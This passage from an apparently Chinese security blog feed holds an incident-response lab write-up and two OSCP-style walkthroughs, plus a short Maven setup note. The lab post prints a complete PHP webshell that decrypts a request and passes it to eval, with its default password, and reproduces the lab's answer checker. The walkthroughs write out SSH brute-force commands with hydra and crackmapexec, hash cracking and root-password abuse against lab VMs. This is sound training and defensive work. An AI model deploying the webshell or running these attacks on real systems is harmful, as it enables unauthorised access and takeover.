alt="image-20240806225030929"></p><p>这里会自动下载相关项目的插件</p><p><img src="/../image/image-20240806225153556.png" alt="image-20240806225153556"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn install  #</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240806225945110.png" alt="image-20240806225945110"></p><p>但还是有些找不到，本来想试试手动安装，但说是不推荐，后续比较麻烦，但他也提供了另一条命令</p><p><a href="https://www.coder.work/article/6959032">https://www.coder.work/article/6959032</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn org.apache.maven.plugins:maven-dependency-plugin:2.6:get -Dartifact=groupId:artifactId:version</span><br></pre></td></tr></table></figure><p>有一点麻烦的就是我不知道要不要确定版本号，感觉还是没配置好，但这样一个一个也能解决问题，麻烦一点就是了</p><p><img src="/../image/image-20240807090129426.png" alt="image-20240807090129426"></p><p>有时候是因为自己手动装的环境，它识别不到，和新下载的冲突了，删除原来的又可以了</p><p><img src="/../image/image-20240807090200926.png" alt="image-20240807090200926"></p><p>但有的时候又还是不行，需要手动改下版本号。。。还有就是安装时会遇到下面这种错误</p><p><img src="/../image/image-20240807090459456.png" alt="image-20240807090459456"></p><p>实际上是安装成功了的</p><p><img src="/../image/image-20240807090609948.png" alt="image-20240807090609948"></p><p>手动配置一下版本</p><p><img src="/../image/image-20240807090658684.png" alt="image-20240807090658684"></p><p>解决了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境配置 </tag>
            
            <tag> maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应靶场-zgsf-web1</title>
      <link href="/2024/08/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-zgsf-web1/"/>
      <url>/2024/08/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-zgsf-web1/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://blog.csdn.net/qq_61872115/article/details/136618102">https://blog.csdn.net/qq_61872115/article/details/136618102</a></p><h1 id="前景需要："><a href="#前景需要：" class="headerlink" title="前景需要："></a>前景需要：</h1><p>小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，这是他的服务器系统，请你找出以下内容，并作为通关条件：</p><p>1.攻击者的shell密码<br>2.攻击者的IP地址<br>3.攻击者的隐藏账户名称<br>4.攻击者挖矿程序的矿池域名</p><p>用户：<br>administrator<br>密码<br><a href="mailto:&#90;&#x67;&#x73;&#x66;&#64;&#97;&#x64;&#109;&#105;&#110;&#x2e;&#99;&#x6f;&#109;">&#90;&#x67;&#x73;&#x66;&#64;&#97;&#x64;&#109;&#105;&#110;&#x2e;&#99;&#x6f;&#109;</a></p><h1 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h1><p>登陆主机，启动小皮</p><p><img src="/../image/image-20240806124005693.png" alt="image-20240806124005693"></p><p>访问网站</p><p><img src="/../image/image-20240806124456124.png" alt="image-20240806124456124"></p><p>找到网站根目录，直接查杀一下是否存在后门文件，我这里用的是D盾</p><p><img src="/../image/image-20240806125049731.png" alt="image-20240806125049731"></p><p>查看文件内容，不是这个。。。用火绒把，也没有</p><p><img src="/../image/image-20240806132945478.png" alt="image-20240806132945478"></p><p>我说呢，被windows defender给隔离了</p><p><img src="/../image/image-20240806133037186.png" alt="image-20240806133037186"></p><p>打开看看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line"><span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到密码rebeyond</p><h1 id="网站日志排查"><a href="#网站日志排查" class="headerlink" title="网站日志排查"></a>网站日志排查</h1><p>查看apache日志，在小皮的扩展里找到日志</p><p><img src="/../image/image-20240806133324756.png" alt="image-20240806133324756"></p><p>发现ip：192.168.126.1一直访问呢shell文件</p><p>然后对于这个地址我们可以访问一下就知道，他是在暴力破解账户密码</p><p><img src="/../image/image-20240806133641734.png" alt="image-20240806133641734"></p><p><img src="/../image/image-20240806133705685.png" alt="image-20240806133705685"></p><p>查看后续日志可发现它破解成功了，很可能是存在弱口令</p><p><img src="/../image/image-20240806133910009.png" alt="image-20240806133910009"></p><p><img src="/../image/image-20240806133817603.png" alt="image-20240806133817603"></p><p>并且在后台访问&#x2F;content&#x2F;plugins&#x2F;tips&#x2F;目录，成功将shell.php后门传上去了</p><p><img src="/../image/image-20240806133947496.png" alt="image-20240806133947496"></p><h1 id="隐藏账户"><a href="#隐藏账户" class="headerlink" title="隐藏账户"></a>隐藏账户</h1><p>多种方法，控制面板或注册表</p><p><img src="/../image/image-20240806134039485.png" alt="image-20240806134039485"></p><p>注册表这边我没有找到，试试日志分析，查看登陆成功的日志，先在事件查看器例保存Security日志，再用logparser分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LogParser.exe -i:EVT -oDATAGRID &quot;SELECT * FROM Security.evtx WHERE EventID=4625&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240806135325167.png" alt="image-20240806135325167"></p><h1 id="挖矿程序"><a href="#挖矿程序" class="headerlink" title="挖矿程序"></a>挖矿程序</h1><p>先在寻找挖矿程序，并找到它的外联域名信息</p><p>找到用户文件夹下的hack168下的桌面文件，发现程序信息先在寻找挖矿程序，</p><p><img src="/../image/image-20240806135435899.png" alt="image-20240806135435899"></p><p>反编译</p><p>列举用到的工具：</p><p>pyinstxtractor反编译工具：<a href="%5BPython38%5D(C:%5CUsers%5Cyxz%5CAppData%5CLocal%5CPrograms%5CPython%5CPython38)">GitHub - extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor</a></p><p>pyc反编译工具：<a href="https://v2.toolkk.com/tools/pyc-decomplie">pyc反编译 - 工具匠</a></p><p>在线的刚好在维护.要换一个</p><p><img src="/../image/image-20240806142135137.png" alt="image-20240806142135137"></p><p>成功反编译，在文件中找到Kuang.pyc</p><p><img src="/../image/image-20240806142201334.png" alt="image-20240806142201334"></p><p>在线反编译</p><p><img src="/../image/image-20240806142230129.png" alt="image-20240806142230129"></p><p>最终得到矿池域名：wakuang.zhigongshanfang.top</p><h1 id="提交结果"><a href="#提交结果" class="headerlink" title="提交结果"></a>提交结果</h1><p>提交到最后一个时，会直接结束</p><p><img src="/../image/image-20240806142356735.png" alt="image-20240806142356735"></p><p>反编译看看结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;公众号：知攻善防实验室&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;欢迎使用知攻善防实验室-应急响应训练靶机解题系统&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;在此之前，您应该获取到以下信息&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1.攻击者的shell密码&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2.攻击者的IP地址&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3.攻击者的隐藏账户名称&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;4.攻击者挖矿程序的矿池域名&#x27;</span>)</span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&#x27;你准备好了吗？（y or n）&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> num == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    shellpass = <span class="built_in">input</span>(<span class="string">&#x27;请输入攻击者的shell密码:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> shellpass == <span class="string">&#x27;rebeyond&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;题解正确！&#x27;</span>)</span><br><span class="line">        IPadd = <span class="built_in">input</span>(<span class="string">&#x27;请输入攻击者的IP地址&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> IPadd == <span class="string">&#x27;192.168.126.1&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;题解正确！&#x27;</span>)</span><br><span class="line">            username = <span class="built_in">input</span>(<span class="string">&#x27;请输入攻击者的隐藏账户名称:&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> username == <span class="string">&#x27;hack168&#x27;</span> <span class="keyword">or</span> username == <span class="string">&#x27;hack168$&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;题解正确！&#x27;</span>)</span><br><span class="line">                wakuang = <span class="built_in">input</span>(<span class="string">&#x27;请输入攻击者挖矿程序的矿池域名:&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> wakuang == <span class="string">&#x27;wakuang.zhigongshanfang.top&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;题解正确！&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;恭喜您，该靶机已被您攻破！&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;恭喜您，该靶机已被您攻破！&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;恭喜您，该靶机已被您攻破！&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;恭喜您，该靶机已被您攻破！&#x27;</span>)</span><br></pre></td></tr></table></figure><p>没错滴</p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-005-Broken</title>
      <link href="/2024/08/04/OSCP-005-Broken/"/>
      <url>/2024/08/04/OSCP-005-Broken/</url>
      
        <content type="html"><![CDATA[<h1 id="Broken-Gallery"><a href="#Broken-Gallery" class="headerlink" title="Broken Gallery"></a>Broken Gallery</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.174.0/24</span><br></pre></td></tr></table></figure><p>获得目标ip：192.168.174.176</p><h2 id="端口，服务扫描"><a href="#端口，服务扫描" class="headerlink" title="端口，服务扫描"></a>端口，服务扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.174.176</span><br></pre></td></tr></table></figure><p>得到22和80端口开放</p><p>下面还有另一种方法，首先通过namp生成扫描结果的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -p- --min-rate 1000 192.168.174.167 -oA ./Broken_galley</span><br></pre></td></tr></table></figure><p>生成报告后，用awk去找，算是练习把</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat Broken_galley.nmap | grep &quot;open&quot; | awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27; </span><br><span class="line">返回22，80</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -sC -sV -p 22,80 192.168.174.176 -oA ./detail</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805195444643.png" alt="image-20240805195444643"></p><p>这种带目录的扫描比较好看</p><h2 id="访问服务"><a href="#访问服务" class="headerlink" title="访问服务"></a>访问服务</h2><p><img src="/../image/image-20240804170115370.png" alt="image-20240804170115370"></p><p><img src="/../image/image-20240804170124532.png" alt="image-20240804170124532"></p><p>有一些图片，和一个readme文件，下载下来是一串16进制的字节码</p><p><img src="/../image/image-20240804174129642.png" alt="image-20240804174129642"></p><p>通过xxd还原成二进制文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxd -r -ps README.md &gt; README.bin</span><br></pre></td></tr></table></figure><ul><li>-r选项用于将十六进制格式转换回二进制格式</li><li>-p表示输出纯粹的十六进制编码，而不包括其他信息</li><li>-s选项用于跳过文件的前N个字节</li></ul><p>通过strings来读二进制文件，通过head来读取前几行内容来确定文件类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings README.bin | head -n 10</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805221742308.png" alt="image-20240805221742308"></p><p>可以看到jfif头，说明这个文件是图片文件，更改为jpg后缀并打开</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv README.bin README.jpg</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805221943926.png" alt="image-20240805221943926"></p><p>应用程序是坏的的，基础设施是坏的。。。没什么思路</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.174.167</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240804174231876.png" alt="image-20240804174231876"></p><p>没什么收获，估计要从图片出发，这里也提供另一种方法</p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -u http://192.168.10.111/ -x txt,rar,zip,tar,sql,php</span><br></pre></td></tr></table></figure><p>内容会更全一点，但在这里也没什么返回，后台挂着，gobuster还可以扫别的内容</p><p><img src="/../image/image-20240805195959568.png" alt="image-20240805195959568"></p><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xdg-open  img_forest.jpg 查看图片的命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings *.jpg | less</span><br></pre></td></tr></table></figure><p>没什么内容</p><p>再用exiftool来看看其他图片，没有发现有隐藏的信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exiftool *.jpg</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805222700803.png" alt="image-20240805222700803"></p><p>也有另一种方法看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steghide extract -sf img_5terre.jpg</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805222810915.png" alt="image-20240805222810915"></p><p>也没什么内容，只能从爆破ssh去测试了</p><h2 id="爆破SSH"><a href="#爆破SSH" class="headerlink" title="爆破SSH"></a>爆破SSH</h2><p>看看文件名有啥提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls | grep .jpg | sed s/\.jpg//</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805222931750.png" alt="image-20240805222931750"></p><p>推测应该是密码或用户名,用这个来生成一个wordlist</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls | grep .jpg | sed s/\.jpg// &gt; wordlist</span><br></pre></td></tr></table></figure><p>接下来用hydra爆破测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L wordlist -P wordlist 192.168.174.176 ssh</span><br></pre></td></tr></table></figure><p>失败，去掉前缀试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat wordlist | sed s/img_// &gt; wordlist2</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805223326918.png" alt="image-20240805223326918"></p><p>再把broken和galley加上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &quot;broken\ngalley&quot; &gt;&gt; wordlist2</span><br></pre></td></tr></table></figure><p>然后利用rsmangler工具，它首先将对所述输入字和生成的所有排列和字样的缩写（为了它们出现在文件中）完成的各种操作之前它适用的其余部分</p><p><a href="https://zing.gitbooks.io/kali-lunix/content/09x/9x29_RSMangler.html">https://zing.gitbooks.io/kali-lunix/content/09x/9x29_RSMangler.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsmangler -m 6 -x 8 -r -d -e -i --punctuation -y -a -C --pna --nb --space --allow-duplicates -f wordlist2 -o mangled</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805223812412.png" alt="image-20240805223812412"></p><p>然后进行爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L wordlist2 -P mangled 192.168.174.176 ssh</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805224445315.png" alt="image-20240805224445315"></p><p>也可以从另一种思路出发，根据图片手动生成字典</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5terre</span><br><span class="line">forest</span><br><span class="line">lights</span><br><span class="line">mountains</span><br><span class="line">Bob</span><br><span class="line">BROKEN</span><br><span class="line">broken</span><br><span class="line">avrahamacohen.ac@gmail.com</span><br><span class="line">avrahamcohen.ac</span><br><span class="line">avrahamcohen</span><br></pre></td></tr></table></figure><p>通过crackmapexec进行SSH爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#--continue-on-success:表示成功获得凭据后继续爆破</span><br><span class="line">#跟john相比，john更偏向快速，creackmapexec支持的协议和功能比较多</span><br><span class="line"></span><br><span class="line">sudo crackmapexec ssh 192.168.10.111 -u creds -p creds --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805224630599.png" alt="image-20240805224630599"></p><p>获得账号密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">broken:broken</span><br></pre></td></tr></table></figure><p>登陆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh broken@192.168.174.176</span><br></pre></td></tr></table></figure><p>查看可以用户环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805224641938.png" alt="image-20240805224641938"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先查看历史命令，看看线索</p><p><img src="/../image/image-20240805224742187.png" alt="image-20240805224742187"></p><p>发现有个密码策略文件，尝试寻找一下这个文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lah</span><br><span class="line">cat .sudo_as_admin_successful</span><br><span class="line">locate password-policy.sh</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805225010573.png" alt="image-20240805225010573"></p><p>得到路径&#x2F;etc&#x2F;init.d&#x2F;pasword-policy.sh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/init.d/password-policy.sh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">DAYOFWEEK=$(date +&quot;%u&quot;)</span><br><span class="line">echo DAYOFWEEK: $DAYOFWEEK</span><br><span class="line"></span><br><span class="line">if [ &quot;$DAYOFWEEK&quot; -eq 4 ]</span><br><span class="line">then</span><br><span class="line">        sudo sh -c &#x27;echo root:TodayIsAgoodDay | chpasswd&#x27;</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$DAYOFWEEK</span>&quot;</span> == 4 ]</span></span><br></pre></td></tr></table></figure><p>这段脚本是一个简单的 Bash 脚本，用于检查当前是星期几，并在星期四时更改 root 用户的密码。下面是脚本的逐行解释：</p><ol><li><code>#!/bin/bash</code>：这是一个 shebang 行，告诉系统这个脚本应该使用哪个解释器来执行，这里是 Bash。</li><li><code>DAYOFWEEK=$(date +&quot;%u&quot;)</code>：这行命令使用 <code>date</code> 命令获取当前的星期数（星期一为 1，星期日为 7），并将其存储在变量 <code>DAYOFWEEK</code> 中。</li><li><code>echo DAYOFWEEK: $DAYOFWEEK</code>：这行打印出当前的星期数。</li><li><code>if [ &quot;$DAYOFWEEK&quot; -eq 4 ]</code>：这是一个条件语句，检查 <code>DAYOFWEEK</code> 是否等于 4（星期四）。</li><li><code>then</code>：如果条件为真（即当前是星期四），则执行下面的命令。</li><li><code>sudo sh -c &#39;echo root:TodayIsAgoodDay | chpasswd&#39;</code>：这行命令使用 <code>sudo</code> 以超级用户权限执行 <code>sh -c</code>，然后通过管道将 <code>echo</code> 命令的输出传递给 <code>chpasswd</code> 命令，从而更改 root 用户的密码为 “TodayIsAgoodDay”。</li><li><code>fi</code>：结束 if 语句。</li></ol><p>注释掉的 <code>#if [ &quot;$DAYOFWEEK&quot; == 4 ]</code> 行是另一种写法，使用 <code>==</code> 进行字符串比较，但由于 <code>DAYOFWEEK</code> 是一个数字，所以应该使用 <code>-eq</code> 来进行数值比较。</p><p>为了测试，我们改成周一的版本,我们先通过下面的方法改一下脚本，再来reboot</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date +&quot;%u&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805230412615.png" alt="image-20240805230412615"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/init.d/password-policy.sh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">DAYOFWEEK=$(date +&quot;%u&quot;)</span><br><span class="line">echo DAYOFWEEK: $DAYOFWEEK</span><br><span class="line"></span><br><span class="line">if [ &quot;$DAYOFWEEK&quot; -eq 1 ]</span><br><span class="line">then</span><br><span class="line">        sudo sh -c &#x27;echo root:TodayIsAgoodDay | chpasswd&#x27;</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$DAYOFWEEK</span>&quot;</span> == 4 ]</span> </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805230552620.png" alt="image-20240805230552620"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.174.176</span><br></pre></td></tr></table></figure><p>记得用broken连上再su root</p><p><img src="/../image/image-20240805230751633.png" alt="image-20240805230751633"></p><h2 id="timedatectl提权"><a href="#timedatectl提权" class="headerlink" title="timedatectl提权"></a>timedatectl提权</h2><p><img src="/../image/image-20240805225707696.png" alt="image-20240805225707696"></p><p>前面我们看到broken用户还可以执行timedatectl命令</p><p>通过gtfobins：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 来查看对应的提权方法</p><p><img src="/../image/image-20240805225855524.png" alt="image-20240805225855524"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo timedatectl list-timezones</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240805230037506.png" alt="image-20240805230037506"></p>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-004-Matrix</title>
      <link href="/2024/08/01/OSCP-004-Matrix/"/>
      <url>/2024/08/01/OSCP-004-Matrix/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP-004-Matrix"><a href="#OSCP-004-Matrix" class="headerlink" title="OSCP-004-Matrix"></a>OSCP-004-Matrix</h1><p>调整为nat模式</p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.174.0/24</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240801202833123.png" alt="image-20240801202833123"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- -T5 192.168.174.161</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240801202919969.png" alt="image-20240801202919969"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p80,6464,7331 -sV --script &quot;default, safe&quot; (IP)</span><br></pre></td></tr></table></figure><p>可以获得的信息<br>80和7331都是python起的http服务</p><p>6464是一个ssh的端口</p><h2 id="访问服务"><a href="#访问服务" class="headerlink" title="访问服务"></a>访问服务</h2><p>80端口</p><p><img src="/../image/image-20240801203406539.png" alt="image-20240801203406539"></p><p>7331端口：一个登陆界面</p><p><img src="/../image/image-20240801203544739.png" alt="image-20240801203544739"></p><p>输入admin:admin后，有个显示，传入后台应该是base64</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;YWRtaW46YWRtaW4=&quot; | base64 -d</span><br></pre></td></tr></table></figure><p>admin:admin</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.174.161</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240802094342918.png" alt="image-20240802094342918"></p><p>访问该目录</p><p><img src="/../image/image-20240802094413249.png" alt="image-20240802094413249"></p><p>可以在img里找到一个rabbit的图片</p><p><img src="/../image/image-20240802094440273.png" alt="image-20240802094440273"></p><p>下载下来试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.174.161/assets/img/Matrix_can-show-you-the-door.png</span><br></pre></td></tr></table></figure><p>官方文档是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings xx.png</span><br><span class="line">zsteg -a xx.png</span><br></pre></td></tr></table></figure><p>用这两个命令看下图片有没有隐写信息，没什么收获</p><p>可以发现图片名提示Matrix提供这个门，尝试访问Matrix目录</p><p><img src="/../image/image-20240802185608055.png" alt="image-20240802185608055"></p><p>发现一串目录，在<code>Matrix/n/e/o/6/4/</code>目录下发现一个<code>secret.gz</code>文件，应该是一个提示，也可以发现是黑客帝国得尼奥得英文名</p><p><img src="/../image/image-20240802185905833.png" alt="image-20240802185905833"></p><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>下载下来试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.174.161/Matrix/n/e/o/6/4/secret.gz</span><br></pre></td></tr></table></figure><p>gunzip试了下，不是gzip文件</p><p>file查看一下，发现是ascii：text文件</p><p>直接cat查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin:76a2173be6393254e72ffa4d6df1030a</span><br></pre></td></tr></table></figure><p>查下md5</p><p><img src="/../image/image-20240802191003458.png" alt="image-20240802191003458"></p><p>也可以不查</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;xxx&quot; &gt; hash</span><br><span class="line">john --show --format=Raw-MD5 hash</span><br></pre></td></tr></table></figure><p>可以得到admin:passwd</p><h2 id="登陆页面目录扫描"><a href="#登陆页面目录扫描" class="headerlink" 